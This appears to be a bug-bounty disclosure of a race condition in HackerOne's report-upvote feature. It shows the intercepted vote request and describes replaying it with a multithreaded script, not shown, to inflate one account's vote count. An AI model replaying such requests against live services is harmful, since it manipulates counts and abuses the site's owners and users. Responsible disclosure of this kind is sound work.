Summary:

This vulnerability allows you to explore a race condition bug on a new feature of hackerone, the popular reports..

To reproduce this bug, you need to intercept the POST request that trigger the "upvote" action.

After having this POST request, i created a script that repeats that POST with multiple threads.

this allows me to, with my single account, favorite multiple times a single tweet increasing its counter.

The post requests repeat was: 
POST https://hackerone.com/reports/127158/votes HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-CSRF-Token: <hidden>
X-Requested-With: XMLHttpRequest
Referer: https://hackerone.com/hacktivity/popular
Cookie: __cfduid=d0b8800c716cf2aa744ddebd0ef2c92e21466701022; session=<hidden>
Connection: close
Cache-Control: max-age=0
Content-Length: 0

In this case,  running my script, returned the response:
{"vote_id":865,"vote_count":48}
{"vote_id":866,"vote_count":49}


Probably if my connection was faster, I would be able to increase even more the counter.
